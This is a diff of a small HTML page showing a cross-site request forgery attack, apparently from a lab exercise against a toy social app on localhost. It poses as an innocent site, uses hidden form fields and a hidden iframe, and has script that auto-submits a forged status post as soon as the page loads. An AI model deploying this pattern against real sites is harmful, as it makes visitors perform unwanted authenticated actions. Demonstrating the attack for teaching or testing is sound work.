@@ -1,16 +1,25 @@
 <html>
 <head>
-    <title>CSRF Attack</title>
+  <title>Faycebook Attack</title>
 </head>
 <body>
-    LOLOLOL??
-    <form name="badform" method="post" action="http://localhost:5000/add">
-        <input type="hidden" name="date" value="2014-04-01T22:50:49.762475" />
-        <input type="hidden" name="title" value="CSRF LOL" />
-        <input type="hidden" name="text" value="selfie plz" />
-    </form>
-    <script type="text/javascript">
-        document.badform.submit();
-    </script>
+  <h1>I am an innocent website!</h1> 
+  <form name="attackFaycebook" method="POST"
+  action="http://localhost:5000/faycebook/add" target="hidden-form">
+    <input type="hidden" name="date" value="2014-04-01T22:50:49.762475" />
+    <input type="hidden" name="user" value="CSRF LOLL" />
+    <input type="hidden" name="status" value="selfie plz" />
+  </form>
+  <iframe style="display:none" name="hidden-form"></iframe>
+
+  <script type="text/javascript">
+    window.onload = function() {
+      // is posting to 'localhost'
+      if (document.getElementsByTagName('form')[0].action.indexOf('faycebook') != -1) {
+        console.log("Attacking Faycebook yo!");
+      }
+    };
+    document.attackFaycebook.submit();
+  </script>
 </body>
 </html>
